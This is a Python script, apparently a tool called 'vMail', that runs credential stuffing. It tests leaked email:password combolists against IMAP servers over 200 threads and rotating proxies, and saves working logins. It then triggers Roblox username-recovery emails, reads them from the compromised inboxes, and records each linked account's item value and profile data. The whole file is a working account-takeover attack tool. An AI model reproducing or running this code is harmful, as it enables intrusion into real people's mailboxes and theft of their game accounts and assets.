import imaplib
import requests
import email
import re
import os
import json
import random
import time
import threading
import socket

socket.setdefaulttimeout(5)

settings = json.load(open('files/settings.json', 'r'))
imap_urls = dict(map(lambda s: s.split('|'), [x  for x in open('files/imap.txt', 'r', errors='ignore').read().splitlines() if len(x.split('|')) == 2]))
combolist = list(filter(lambda o: re.search('@(.*):', o) != None and re.search('@(.*):', o).group(1) in imap_urls and re.search('@(.*):', o).group(1) not in settings['blacklist'], [y for y in open('files/combo.txt', 'r', encoding='utf-8', errors='replace').read().splitlines()]))
proxies = open('files/proxies.txt', 'r', encoding='utf-8').read().splitlines()
proxy_error, checked, hits, mail_access, accs, t_rap = 0, 0, 0, 0, 0, 0


class Roblox:
    def getid(username):
        req = requests.get(f'https://api.roblox.com/users/get-by-username?username={username}').json()
        if 'Id' in req: return req['Id']
        else: return None
    def getRap(userId, cursor, rap=0):
        req = requests.get(f'https://inventory.roblox.com/v1/users/{userId}/assets/collectibles?limit=100&cursor={cursor}').json()
        if "data" in req:
            for i in req["data"]:
                if 'recentAveragePrice' in i:
                    print('test', i)
                    rap = rap + i['recentAveragePrice']
        if 'nextPageCursor' in req and req['nextPageCursor'] != None:
            return getRap(userId,req['nextPageCursor'], rap)
        return rap
    def getJoin(userId):
        req = requests.get(f'https://www.roblox.com/users/{userId}/profile')
        mmddyyyy = re.search(r'Join Date<p class=text-lead>[0-9]+\/[0-9]+\/(.*?)<li class=profile-stat>', req.text).group(1)
        return mmddyyyy
    def send_pwreq(mail, proxy, header, th):
        global proxy_error
        if th >= settings['tries']: return None
        th += 1
        try:
            req = requests.post(
                url='https://auth.roblox.com/v1/usernames/recover',
                json={"targetType": "Email", "target": mail},
                headers = {"X-CSRF-TOKEN": header},
                proxies={'https':proxy},
                timeout=10
            )
            time.sleep(3)
            if '"transmissionType":"Email"}' in req.text:
                return True
            elif "X-CSRF-TOKEN" in req.headers: 
                return Roblox.send_pwreq(mail, proxy, req.headers['X-CSRF-TOKEN'], th)
            elif '{"errors":[{"code":11,"message":"Too many attempts. Please wait a bit."}]}' in req.text: 
                return None
            else: Roblox.send_pwreq(mail, '')
        except Exception as exc:
            proxy_error += 1
            print('probably a proxy error', exc, mail)
            return Roblox.send_pwreq(mail, random.choice(proxies), '', th)

def fetchaccounts(emailstring):
    try:
        regex = re.search('Your accounts are listed below:(.*?)This message', emailstring) 
        return list(filter(None, regex.group(1).replace('\\r', '').split('\\n')))
    except:
        return None

def capture(accounts, combo): #TODO: fix this mess
    global t_rap
    list_accs = []
    for account in accounts:
        accs= {}
        try:
            uid = Roblox.getid(account)
            if not uid: continue
            rap = Roblox.getRap(uid, '', 0)
            t_rap += rap; accs['rap'] = rap
            for y, z in dict.items(requests.get(f'https://www.roblox.com/profile?userid={uid}').json()):
                accs[y] = z
            accs['year'] = Roblox.getJoin(uid); accs['combo'] = combo
            list_accs.append(str(accs))
        except:
            continue
    return list_accs

def maintr(username, password):
    try:
        global mail_access
        global checked
        global accs
        global hits
        checked += 1
        url = re.search('@(.*)$', username).group(1)
        imap_client = imaplib.IMAP4_SSL(imap_urls[url])
        imap_client.login(username, password)
        imap_client.select()
        mail_access += 1
        with open('Valid.txt', 'a') as oof:
            oof.write(f"{username}:{password}\n")
        email_list = imap_client.search(None,'(FROM "@roblox.com")')[1][0].split()
        if email_list != []: #he the one
            if settings['get_accounts'] == True:
                pw = Roblox.send_pwreq(username, random.choice(proxies), '', 0)
                if pw == True:
                    time.sleep(settings['waittime'])
                    email_list = imap_client.search(None,'(SUBJECT "Roblox Accounts Reminder")')[1][0].split()
                    mail = imap_client.fetch(email_list[-1], "(RFC822)")
                    decoded = re.sub('<[^>]*>|\\*', '', str(mail[1]))
                    accounts = fetchaccounts(decoded)
                    accs += len(accounts); hits += 1
                    if not accounts: return False
                    open('Successful Hits.txt', 'a').write("\n".join(capture(accounts, f"{username}:{password}")) + '\n')
                else:
                    open("nocapture.txt", 'a').write(f'{username}:{password} -> {len(email_list)} emails from Roblox\n')
            else:
                open("nocapture.txt", 'a').write(f'{username}:{password} -> {len(email_list)} emails from Roblox\n')     
    except:
        pass

def cthread():
    while len(combolist) > 0:
        u,p = combolist.pop().split(':')
        maintr(u, p)

for _ in range(200):
    threading.Thread(target=cthread).start()


while True:
    time.sleep(1)
    os.system('cls')
    print(f'vMail\nChecked: {checked}\nGood emails: {hits}\nMailaccess: {mail_access}\nAccs: {accs}\nLeft: {len(combolist)}\nRap: {t_rap}')
